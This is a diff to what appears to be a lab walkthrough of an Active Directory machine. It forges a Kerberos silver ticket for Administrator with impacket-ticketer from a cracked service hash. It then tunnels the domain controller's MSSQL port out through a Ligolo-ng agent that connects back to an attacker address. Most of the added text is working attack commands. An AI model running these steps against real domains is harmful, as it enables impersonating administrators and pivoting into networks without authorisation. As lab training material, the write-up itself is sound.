@@ -331,10 +331,67 @@ SPN Password Hash
 ```bash
 E3A0168BC21CFB88B95C954A5B18F57C
 ```
-Target SPN service account
+
+Later, we obtained the Administrator ticket using impacket‑ticketer
 
 ```bash
-Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
+```
+<img width="1483" height="376" alt="image" src="https://github.com/user-attachments/assets/bed69b42-f092-417b-abe5-1985bc2fcfc8" />
+
+```bash
+export KRB5CCNAME=Administrator.ccache
 ```
 
+Now we can use the silver ticket to connect via Kerberos
 
+And now create this file:
+```bash
+sudo nano /etc/krb5user.conf
+```
+```bash
+[libdefaults]
+        default_realm = NAGOYA-INDUSTRIES.COM
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+    rdns = false
+    dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]
+        NAGOYA-INDUSTRIES.COM = {
+                kdc = nagoya.nagoya-industries.com
+        }
+
+[domain_realm]
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
+```
+Once that is done we can move on to port forwarding and gaining access via mssql.
+Admin Privilege Escalation:
+Port Forwarding Using Ligolo-ng:
+
+To access the SQL Server running on the Domain Controller, I used Ligolo-ng to set up a secure tunnel and forward port 1433 to my attacker machine.
+
+🛠 Step 1: Set up the TUN interface on your attacker machine:
+
+```bash
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+```
+    This creates a virtual network interface that Ligolo-ng will use for tunneling.
+
+🛠 Step 2: Start the Ligolo proxy on your attacker machine:
+```bash
+sudo ./proxy -selfcertt
+```
+<img width="1072" height="334" alt="image" src="https://github.com/user-attachments/assets/75ed26d7-e5a9-4f50-befd-04f33797fa57" />
+
+🛠 Step 3: Run the Ligolo relay (agent) on the target machine:
+
+First, upload the Ligolo-ng agent binary (compiled for Windows) to the target (e.g., via evil-winrm upload), then run it:
+
+```bash
+/agent.exe -connect 192.168.55.21:11601 -ignore-cert
+```
